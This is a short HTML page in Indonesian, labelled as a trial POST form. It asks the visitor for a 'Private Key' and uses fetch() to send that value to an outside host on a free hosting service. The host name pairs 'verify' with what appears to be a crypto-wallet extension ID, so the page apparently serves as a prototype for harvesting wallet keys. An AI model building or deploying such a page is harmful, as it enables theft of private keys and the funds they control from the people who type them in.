<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Percobaan POST</title>
</head>
<body>
    <h2>Uji Coba Form POST ke InfinityFree</h2>
    <input type="text" id="privateKey" placeholder="Masukkan Private Key">
    <button onclick="submitForm()">Kirim</button>

    <script>
        function submitForm() {
            let privateKey = document.getElementById("privateKey").value;
            console.log("Mengirim Private Key:", privateKey);

            fetch("https://verify-nkbihfbeogaeaoehlefn.infy.uk/test_post.php", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ privateKey: privateKey })
            })
            .then(response => response.text())
            .then(data => console.log("Response dari server:", data))
            .catch(error => console.error("Error:", error));
        }
    </script>
</body>
</html>
